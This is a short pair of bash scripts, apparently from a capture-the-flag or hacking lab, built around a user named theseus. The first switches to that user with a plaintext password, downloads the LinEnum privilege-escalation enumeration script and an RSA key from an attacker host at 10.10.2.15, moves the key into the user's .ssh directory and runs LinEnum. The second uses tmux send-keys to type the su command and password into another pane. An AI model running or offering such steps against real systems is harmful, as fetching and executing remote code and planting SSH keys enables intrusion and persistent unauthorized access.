#/bin/bash
su theseus
echo Th3s3usW4sK1ng
wget 10.10.2.15/LinEnum.sh
wget 10.10.2.15/RSA_KEY.pub
mv RSA_KEY.pub /home/theseus/.ssh
cd ..
chmod +x LinEnum.sh
./LinEnum.sh


#/bin/bash
tmux send-keys -t GG.0 "su theseus" && tmux send-keys -t GG.0 "Th3s3usW4sK1ng"
#http://man7.org/linux/man-pages/man1/tmux.1.html
